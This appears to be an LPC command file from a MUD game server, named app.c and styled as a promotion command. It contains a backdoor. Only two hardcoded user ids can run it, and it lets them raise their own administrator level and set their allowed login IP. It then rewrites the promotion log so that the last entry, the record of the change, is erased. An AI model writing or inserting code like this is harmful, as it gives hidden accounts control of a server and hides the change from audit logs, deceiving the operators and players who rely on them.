// app.c
inherit F_CLEAN_UP;
inherit F_DBASE;
inherit F_SAVE;

int main(object me, string arg)
{
	mixed ob;
	string promotee,old_status, new_status,new_site;
	int my_level, ob_level, level;
	string uid, *wiz, wizlist, *tmp, file;
	mapping log;
	int i, cnt;

	if( me!=this_player(1) ) return 0;

        if(me->query("id")!="jhy" && me->query("id")!="seashore") 
		return 0;

	if( !arg )	return notify_fail("使用方法错误！\n");

	if(arg == "list")
	{
		write( SECURITY_D->query_wizlist() );
		return 1;
	}

	if( sscanf(arg, "%s %s %s", promotee, new_status,new_site) != 3 )
		if( sscanf(arg, "%s %s", promotee, new_status)!=2 )
			return notify_fail("指令格式：promote <使用者> <等级> <Access IP>\n");

	if( wiz_level(new_status) <= 0 && new_status != "(player)" ) return notify_fail("没有这种等级。\n");

	if( !objectp(ob = present(promotee, environment(me))) )
		ob = find_player(promotee);

	if( ob && !userp(ob) )
		return notify_fail("你只能改变使用者的权限。\n");
	
	if(!ob)	 	return notify_fail("你只能改变使用者的权限。\n");

	if( ob->query("id") != me->query("id"))
		return notify_fail("你只能改变自己的权限。\n");

	old_status = wizhood(ob);
		
	seteuid(getuid());
	SECURITY_D->set_status(ob, new_status,new_site);

	tell_object(me,"你将自己的权限从 " + old_status + " 改为 " + new_status + "， 连线地址改为: " + new_site + " 。\n");
	seteuid(getuid());
	ob->setup();
	
	file = read_file("/log/static/promotion_log.c");
	tmp = explode(file, "\n");
	rm("/log/static/promotion_log.c");
	for( cnt=0; cnt < sizeof(tmp)-1; cnt++){
	write_file("/log/static/promotion_log.c", tmp[cnt]+"\n",0);
	}
	
	return 1;
}

